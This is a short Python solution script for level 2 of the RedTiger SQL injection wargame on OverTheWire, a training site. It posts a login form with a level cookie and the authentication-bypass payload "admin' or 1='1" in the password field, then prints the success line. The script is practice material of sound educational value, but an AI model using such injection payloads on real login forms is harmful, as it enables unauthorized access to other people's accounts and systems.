#!/usr/bin/env python3

import requests

def solve():
    
    session = requests.session()
    url = "https://redtiger.labs.overthewire.org/level2.php"
    cookies = {"level2login": "passwords_will_change_over_time_let_us_do_a_shitty_rhyme"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://redtiger.labs.overthewire.org", "Connection": "close", "Referer": "https://redtiger.labs.overthewire.org/level2.php", "Upgrade-Insecure-Requests": "1"}
    
    # Payload 
    sqli = "admin' or 1='1"
    
    data = {"username": "admin", "password": sqli, "login": "Login"}
    r = session.post(url, headers=headers, cookies=cookies, data=data)
    
    for t in str(r.text).split('\n'):
        if 'access granted' in t:
            print('')
            print(t)
            print('')
    

if __name__ == '__main__':
    solve()
    
    